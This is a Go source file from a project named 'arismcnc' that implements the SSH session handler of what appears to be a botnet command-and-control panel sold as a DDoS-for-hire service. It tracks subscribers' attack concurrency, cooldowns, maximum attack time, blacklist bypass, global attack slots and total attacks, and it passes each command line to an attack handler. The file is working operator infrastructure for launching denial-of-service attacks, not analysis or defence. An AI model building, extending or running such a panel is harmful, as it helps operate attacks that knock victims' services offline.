package handlers

import (
	"arismcnc/database"
	"arismcnc/utils"
	"fmt"
	"io"
	"log"
	"strconv"
	"strings"
	"sync"
	"text/tabwriter"
	"time"

	"github.com/gliderlabs/ssh"
	"github.com/mattn/go-shellwords"
	"golang.org/x/crypto/ssh/terminal"
	"golang.org/x/term"
)

var OnlineUsers = 0

var (
	OnlineUsernames []string
	mu              sync.Mutex // Mutex to protect access to OnlineUsernames
)
var UserConnectionTimes = make(map[string]time.Time)

var ActiveSessions = make(map[string]ssh.Session) // Map to track active sessions

// AddUser adds a username to the OnlineUsernames list and increments the OnlineUsers counter
func AddUser(username string) {
	mu.Lock()
	defer mu.Unlock()
	for _, user := range OnlineUsernames {
		if user == username {
			return // Prevent duplicates
		}
	}
	OnlineUsernames = append(OnlineUsernames, username)
	OnlineUsers++
	UserConnectionTimes[username] = time.Now()
}

// RemoveUser removes a username from the OnlineUsernames list and decrements the OnlineUsers counter
func RemoveUser(username string) {
	mu.Lock()
	defer mu.Unlock()

	// Only remove the user if they exist in the list
	for i, user := range OnlineUsernames {
		if user == username {
			// Log for debugging
			OnlineUsernames = append(OnlineUsernames[:i], OnlineUsernames[i+1:]...)
			OnlineUsers--
			delete(UserConnectionTimes, username)
			break
		}
	}

	// Make sure to check ActiveSessions before removing
	if session, ok := ActiveSessions[username]; ok {
		session.Close() // Close session to free resources
		delete(ActiveSessions, username)
	}
}

// IsUserOnline checks if a user is already online
func IsUserOnline(username string) bool {
	mu.Lock()
	defer mu.Unlock()
	for _, user := range OnlineUsernames {
		if user == username {
			return true
		}
	}
	return false
}

func SessionHandler(db *database.Database, session ssh.Session) {
	username := session.User()
	utils.Init()

	if existingSession, ok := ActiveSessions[username]; ok {
		term := terminal.NewTerminal(session, "")
		term.Write([]byte("You have an active session already. Disconnect the other session? [y/n]: "))
		response, _ := term.ReadLine()

		if strings.ToLower(response) == "y" {
			// Disconnect the existing session
			log.Printf("Disconnecting existing session for user %s", username)
			existingSession.Close()
			RemoveUser(username) // Clean up old session data

			// Re-register the new session AFTER cleanup
			log.Printf("\033[32mSuccessful\033[0m SSH Connection from: \033[34m%s\033[0m@\033[34m%s\033[0m using \033[34m%s\033[0m", username, session.RemoteAddr().String(), session.Context().ClientVersion())
			ActiveSessions[username] = session
			AddUser(username)
			UserConnectionTimes[username] = time.Now()

			term.Write([]byte("Previous session disconnected. Welcome to your new session.\n"))
		} else {
			term.Write([]byte("Session login canceled.\n"))
			return
		}
	} else {
		// No active session, directly register the new session
		log.Printf("\033[32mSuccessful\033[0m SSH Connection from: \033[34m%s\033[0m@\033[34m%s\033[0m using \033[34m%s\033[0m", username, session.RemoteAddr().String(), session.Context().ClientVersion())
		AddUser(username)
		ActiveSessions[username] = session
		UserConnectionTimes[username] = time.Now()
	}

	// Register the new session
	// Register the session and clean up properly when done
	ActiveSessions[username] = session
	AddUser(username)

	// Load user information
	config, err := utils.LoadConfig("assets/config.json")
	if err != nil {
		log.Fatalf("failed to load config: %v", err)
	}
	userInfo := db.GetAccountInfo(username)
	userIp := session.RemoteAddr().String()

	// First-time password setup if IP not registered
	if !db.CheckIfIpExists(userInfo.Username) {
		term := terminal.NewTerminal(session, "")
		term.Write([]byte("Please type a new password: "))
		password, _ := term.ReadPassword("")
		term.Write([]byte("Please retype the password: "))
		password2, _ := term.ReadPassword("")

		if password != password2 {
			term.Write([]byte("Passwords do not match\n"))
			RemoveUser(username)
			return
		}
		db.ChangePassword(userInfo.Username, password)
	}

	db.UpdateIp(userInfo.Username, userIp)
	// Branding and setup for the session
	expiryTime, err := time.Parse("2006-01-02 15:04:05", userInfo.Expiry)
	brandingDataPrompt := map[string]interface{}{
		"user.Username":            session.User(),
		"user.Expiry":              utils.CalculateExpiryString(expiryTime),
		"user.Admin":               utils.CalculateInt(userInfo.Admin),
		"user.Vip":                 utils.CalculateInt(userInfo.Vip),
		"user.Private":             utils.CalculateInt(userInfo.Private),
		"user.Concurrents":         strconv.Itoa(userInfo.Concurrents),
		"user.Cooldown":            strconv.Itoa(userInfo.Cooldown),
		"user.Maxtime":             strconv.Itoa(userInfo.Maxtime),
		"user.Api_access":          utils.CalculateInt(userInfo.ApiAccess),
		"user.Power_saving_bypass": utils.CalculateInt(userInfo.PowerSaving),
		"user.Spam_bypass":         utils.CalculateInt(userInfo.BypassSpam),
		"user.Blacklist_bypass":    utils.CalculateInt(userInfo.BypassBlacklist),
		"user.SSH_Client":          session.Context().ClientVersion(),
		"user.Created_by":          userInfo.CreatedBy,
		"user.Total_attacks":       strconv.Itoa(db.GetUserTotalAttacks(userInfo.Username)),
	}

	customPrompt := utils.Branding(session, "prompt", brandingDataPrompt)
	term := term.NewTerminal(session, customPrompt)

	brandingDataMessages := map[string]interface{}{
		"user.Username":            session.User(),
		"user.Expiry":              utils.CalculateExpiryString(expiryTime),
		"user.Admin":               utils.CalculateInt(userInfo.Admin),
		"user.Vip":                 utils.CalculateInt(userInfo.Vip),
		"user.Private":             utils.CalculateInt(userInfo.Private),
		"user.Concurrents":         strconv.Itoa(userInfo.Concurrents),
		"user.Cooldown":            strconv.Itoa(userInfo.Cooldown),
		"user.Maxtime":             strconv.Itoa(userInfo.Maxtime),
		"user.Api_access":          utils.CalculateInt(userInfo.ApiAccess),
		"user.Power_saving_bypass": utils.CalculateInt(userInfo.PowerSaving),
		"user.Spam_bypass":         utils.CalculateInt(userInfo.BypassSpam),
		"user.Blacklist_bypass":    utils.CalculateInt(userInfo.BypassBlacklist),
		"user.SSH_Client":          session.Context().ClientVersion(),
		"user.Created_by":          userInfo.CreatedBy,
		"user.Total_attacks":       strconv.Itoa(db.GetUserTotalAttacks(userInfo.Username)),
		"clear":                    "\x1b[2J \x1b[H",
		"sleep": func(duration int) {
			time.Sleep(time.Duration(duration) * time.Millisecond)
		},
	}

	welcomeMessage := utils.Branding(session, "home-splash", brandingDataMessages)
	utils.SendMessage(session, welcomeMessage, true)

	// Periodic title updater
	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()
		for range ticker.C {
			slotsInUse := db.GetCurrentAttacksLength()
			slots := config.Global_slots

			// Update brandingDataTitle with the latest values
			brandingDataTitle := map[string]interface{}{
				"user.Username":            session.User(),
				"user.Expiry":              utils.CalculateExpiryString(expiryTime),
				"user.Admin":               utils.CalculateInt(userInfo.Admin),
				"user.Vip":                 utils.CalculateInt(userInfo.Vip),
				"user.Private":             utils.CalculateInt(userInfo.Private),
				"user.Concurrents":         strconv.Itoa(userInfo.Concurrents),
				"user.Cooldown":            strconv.Itoa(userInfo.Cooldown),
				"user.Maxtime":             strconv.Itoa(userInfo.Maxtime),
				"user.Api_access":          utils.CalculateInt(userInfo.ApiAccess),
				"user.Power_saving_bypass": utils.CalculateInt(userInfo.PowerSaving),
				"user.Spam_bypass":         utils.CalculateInt(userInfo.BypassSpam),
				"user.Blacklist_bypass":    utils.CalculateInt(userInfo.BypassBlacklist),
				"user.SSH_Client":          session.Context().ClientVersion(),
				"user.Created_by":          userInfo.CreatedBy,
				"cnc.Totalslots":           strconv.Itoa(slots),
				"cnc.Online":               strconv.Itoa(OnlineUsers),
				"cnc.Usedslots":            strconv.Itoa(slotsInUse),
				"user.Total_attacks":       strconv.Itoa(db.GetUserTotalAttacks(userInfo.Username)),
			}

			// Set the updated title
			utils.SetTitle(session, utils.Branding(session, "title", brandingDataTitle))
		}
	}()

	commandHandler := NewCommandHandler(db, session)

	for {
		line, err := term.ReadLine()
		if err != nil {
			if err == io.EOF {
				break
			}
			log.Printf("Error reading input: %v", err)
			break
		}

		line = strings.ToLower(line)
		args, _ := shellwords.Parse(line)

		if line == "" || len(args) == 0 {
			continue
		}

		AttackHandler(db, session, args)

		if line == "exit" || line == "quit" || line == "q" || line == "logout" {
			term.Write([]byte("Goodbye!\n"))
			break
		}

		// Display online users
		if line == "online" {
			var output strings.Builder
			DisplayOnlineUsers(db, session, &output)
			term.Write([]byte(output.String()))
			continue
		}

		commandHandler.ExecuteCommand(line, term)
	}
	RemoveUser(username)
	delete(ActiveSessions, username)
}

func DisplayOnlineUsers(db *database.Database, session ssh.Session, output io.Writer) {
	w := tabwriter.NewWriter(output, 0, 0, 2, ' ', 0)

	// Header
	fmt.Fprintln(w, "\033[37;1m#\tUsername        \tConnected   \tRoles\033[0m")
	fmt.Fprintln(w, "\033[37;1m--\t-------------- \t------------ \t--------------\033[0m")

	// Loop through OnlineUsernames to print each user
	for index, user := range OnlineUsernames {
		userInfo := db.GetAccountInfo(user)
		roleLabels := utils.GenerateRoleLabels(userInfo.Admin, userInfo.Vip, userInfo.Private)

		// Calculate activity time
		connectionTime, exists := UserConnectionTimes[user]
		if !exists {
			connectionTime = time.Now() // Fallback to avoid potential issues if not found
		}
		activityDuration := time.Since(connectionTime)
		activityTimeStr := formatDuration(activityDuration)

		// Print each row
		fmt.Fprintf(w, "\033[37;1m%d\t %s\t %s\t %s\t\033[0m\n",
			index+1, userInfo.Username, activityTimeStr, roleLabels)
	}

	w.Flush()
}

func formatUsername(username string) string {
	return fmt.Sprintf("%-14s", username) // Ensure usernames align by padding to 14 characters
}

func formatDuration(d time.Duration) string {
	h := d / time.Hour
	d -= h * time.Hour
	m := d / time.Minute
	d -= m * time.Minute
	s := d / time.Second
	return fmt.Sprintf("%02d:%02d:%02d", h, m, s)
}
